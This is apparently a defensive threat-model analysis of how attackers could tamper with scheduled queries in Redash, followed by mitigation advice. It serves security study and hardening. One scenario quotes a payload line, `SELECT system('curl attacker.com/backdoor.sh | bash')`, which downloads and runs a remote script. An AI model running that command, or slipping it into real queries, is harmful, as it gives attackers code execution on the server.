## Deep Analysis of the "Manipulation of Scheduled Query Definitions" Attack Surface in Redash

This document provides a deep analysis of the "Manipulation of Scheduled Query Definitions" attack surface in a Redash application, as requested. We will delve into the potential vulnerabilities, contributing factors within Redash, detailed impact scenarios, and expanded mitigation strategies for both development teams and users.

**Attack Surface:** Manipulation of Scheduled Query Definitions

**Description (Revisited):**  This attack surface arises from the possibility of unauthorized individuals or processes altering the definition of scheduled queries within Redash. This manipulation can range from subtle changes to completely replacing the original query with malicious code or queries designed for data exfiltration or server compromise. The core vulnerability lies in weaknesses within the access control mechanisms governing scheduled queries and potential vulnerabilities in how Redash handles and executes these schedules.

**How Redash Contributes (Detailed):**

Redash's scheduling feature, while powerful for automation, inherently introduces this attack surface. Several aspects of Redash's design and implementation can contribute to its exploitability:

* **Storage of Scheduled Query Definitions:**  Understanding where and how Redash stores scheduled query definitions is crucial. If these definitions are stored in a way that lacks proper access controls (e.g., directly in a database table without granular permissions), it becomes a prime target.
* **API Endpoints for Managing Schedules:** Redash exposes API endpoints for creating, reading, updating, and deleting scheduled queries. Vulnerabilities in these endpoints, such as lack of proper authentication, authorization checks, or input validation, can be exploited.
* **User Roles and Permissions:** The granularity and enforcement of user roles and permissions are critical. If users have overly broad permissions, they might be able to modify schedules they shouldn't. Weak default configurations can also exacerbate this.
* **Query Execution Context:**  The user context under which scheduled queries are executed is important. If queries run with elevated privileges or under a shared service account, a compromised schedule can have a wider impact.
* **Lack of Audit Logging:** Insufficient or incomplete logging of changes to scheduled queries makes it difficult to detect and respond to malicious modifications.
* **Potential for Injection Vulnerabilities:** If the scheduling mechanism allows for dynamic construction of execution commands based on user input (even indirectly), it could be susceptible to injection vulnerabilities (e.g., command injection).
* **Third-Party Integrations:** If Redash integrates with other systems for scheduling or data sources, vulnerabilities in these integrations could be leveraged to manipulate Redash schedules.

**Example (Expanded Scenarios):**

Beyond the initial example, consider these more detailed scenarios:

* **Data Exfiltration via Modified Query:** An attacker gains access (e.g., through compromised credentials or a vulnerability) and modifies a scheduled query that normally generates a report. They alter the query to include a `UNION ALL` statement that selects sensitive data from other tables and then configures the schedule to email the results to an external, attacker-controlled address.
* **Remote Code Execution via Modified Query:** An attacker modifies a scheduled query to execute system commands on the Redash server. This could be achieved if Redash allows for certain types of queries or extensions that can interact with the operating system (e.g., using a specific database function or a Redash plugin with insufficient security). For instance, they might inject a command like `SELECT system('curl attacker.com/backdoor.sh | bash')`.
* **Denial of Service via Resource Exhaustion:** An attacker modifies a scheduled query to be extremely resource-intensive (e.g., joining massive tables without proper filtering) and sets it to run frequently. This could overload the Redash server or the underlying database, leading to a denial of service.
* **Privilege Escalation:** An attacker with limited permissions modifies a scheduled query owned by a user with higher privileges. If the query execution context inherits the owner's privileges, the attacker can effectively execute code or access data with elevated permissions.
* **Data Corruption:** An attacker modifies a scheduled query that is responsible for data processing or updates, causing it to write incorrect or malicious data into the connected data sources.

**Impact (Detailed Consequences):**

The impact of successfully exploiting this attack surface can be severe and far-reaching:

* **Confidentiality Breach:**  Unauthorized access and exfiltration of sensitive data, including customer information, financial records, intellectual property, etc. This can lead to legal repercussions, reputational damage, and financial losses.
* **Integrity Compromise:**  Modification or deletion of critical data within connected data sources, leading to inaccurate reporting, flawed decision-making, and potential operational disruptions.
* **Availability Disruption:** Denial of service attacks against the Redash server or connected databases, preventing legitimate users from accessing and utilizing the platform.
* **System Compromise:** Remote code execution on the Redash server can allow attackers to gain complete control of the server, install malware, pivot to other systems on the network, and establish persistent access.
* **Reputational Damage:** Public disclosure of a security breach can severely damage the organization's reputation and erode customer trust.
* **Financial Losses:** Costs associated with incident response, data breach notifications, legal fees, regulatory fines, and business disruption.
* **Compliance Violations:**  Failure to protect sensitive data can lead to violations of various data privacy regulations (e.g., GDPR, CCPA).

**Risk Severity (Justification):**

The "High" risk severity is justified due to the potential for significant and widespread impact. The ability to execute arbitrary code or exfiltrate sensitive data directly from a business intelligence platform poses a critical threat to the confidentiality, integrity, and availability of organizational assets. The ease with which a compromised schedule can be silently executed makes detection challenging, further amplifying the risk.

**Mitigation Strategies (Expanded and Actionable):**

**For Developers:**

* **Implement Granular Role-Based Access Control (RBAC):**
    * **Fine-grained Permissions:**  Move beyond simple "admin" or "user" roles. Implement permissions specifically for creating, reading, updating, and deleting scheduled queries, and assign these permissions based on the principle of least privilege.
    * **Ownership Model:**  Clearly define ownership of scheduled queries and restrict modification rights to the owner and designated administrators.
    * **API Access Control:**  Enforce strict authentication and authorization for all API endpoints related to scheduled query management. Use secure authentication mechanisms (e.g., OAuth 2.0) and ensure proper validation of user roles and permissions before granting access.
* **Secure Storage of Scheduled Query Definitions:**
    * **Encryption at Rest:** Encrypt the storage location of scheduled query definitions (e.g., database tables) to protect sensitive information even if the storage is compromised.
    * **Access Control Lists (ACLs):** Implement ACLs at the storage level to further restrict access to scheduled query definitions.
* **Robust Input Validation and Sanitization:**
    * **Parameter Validation:**  Thoroughly validate all input parameters related to scheduled query creation and modification to prevent injection attacks.
    * **Query Sanitization:**  If possible, implement mechanisms to sanitize or analyze the SQL queries themselves for potentially malicious code. This is a complex task but can significantly reduce risk.
* **Comprehensive Audit Logging:**
    * **Track All Changes:** Log all actions related to scheduled queries, including creation, modification, deletion, execution, and changes in ownership or scheduling parameters.
    * **Detailed Information:** Include timestamps, user IDs, the specific changes made, and the IP address of the request.
    * **Secure Logging:** Ensure logs are stored securely and are tamper-proof. Consider centralizing logs for easier monitoring and analysis.
* **"Safe Mode" or Review Process for New/Modified Scheduled Queries:**
    * **Approval Workflow:** Implement a workflow where new or modified scheduled queries require approval from authorized personnel before they are activated.
    * **Automated Analysis:**  Integrate automated security analysis tools to scan new or modified queries for potential risks (e.g., use of dangerous functions, access to sensitive tables).
    * **Sandboxing:** Consider running new or modified queries in a sandboxed environment initially to observe their behavior before deploying them to production.
* **Secure Query Execution Environment:**
    * **Principle of Least Privilege:** Ensure scheduled queries are executed with the minimum necessary privileges to access the required data. Avoid running queries under highly privileged service accounts.
    * **Isolated Execution Contexts:** Explore options for isolating the execution environment of scheduled queries to limit the potential impact of a compromised query.
* **Regular Security Assessments and Penetration Testing:**
    * **Identify Vulnerabilities:** Conduct regular security assessments and penetration testing specifically targeting the scheduling functionality to identify potential vulnerabilities.
* **Secure Coding Practices:**
    * **Follow Secure Development Lifecycle (SDLC) principles:** Incorporate security considerations throughout the development process.
    * **Avoid Hardcoding Credentials:**  Never hardcode database credentials or other sensitive information within scheduled queries. Use secure credential management mechanisms.
* **Dependency Management:**
    * **Keep Libraries Up-to-Date:** Regularly update Redash dependencies to patch known security vulnerabilities.

**For Users:**

* **Regularly Review Scheduled Queries and Their Owners:**
    * **Periodic Audits:**  Establish a process for regularly reviewing the list of active scheduled queries, their purpose, their owners, and their execution history.
    * **Identify Anomalies:** Look for unfamiliar or suspicious queries, changes in ownership, or unexpected execution patterns.
* **Restrict Access to the Scheduling Functionality:**
    * **Principle of Least Privilege:**  Grant access to the scheduling functionality only to users who absolutely need it.
    * **Training and Awareness:** Educate users about the risks associated with manipulating scheduled queries and the importance of secure practices.
* **Use Strong, Unique Passwords and Multi-Factor Authentication (MFA):**
    * **Account Security:**  Enforce strong password policies and implement MFA to protect user accounts from unauthorized access.
* **Be Cautious of Sharing Credentials:**
    * **Individual Accounts:** Encourage the use of individual user accounts instead of shared accounts.
* **Monitor for Suspicious Activity:**
    * **Review Audit Logs:**  Regularly review the audit logs for any suspicious activity related to scheduled queries.
    * **Alerting Mechanisms:**  Implement alerting mechanisms to notify administrators of any unauthorized modifications or unusual execution patterns.
* **Report Suspicious Queries or Modifications:**
    * **Incident Response:**  Establish a clear process for users to report any suspicious scheduled queries or modifications they encounter.
* **Understand the Impact of Query Modifications:**
    * **Testing and Validation:** Before modifying a scheduled query, understand its purpose and potential impact. Test changes in a non-production environment if possible.

**Conclusion:**

The "Manipulation of Scheduled Query Definitions" attack surface presents a significant security risk in Redash deployments. By understanding the potential vulnerabilities, implementing robust security controls, and fostering a security-conscious culture among developers and users, organizations can effectively mitigate this risk and protect their sensitive data and systems.
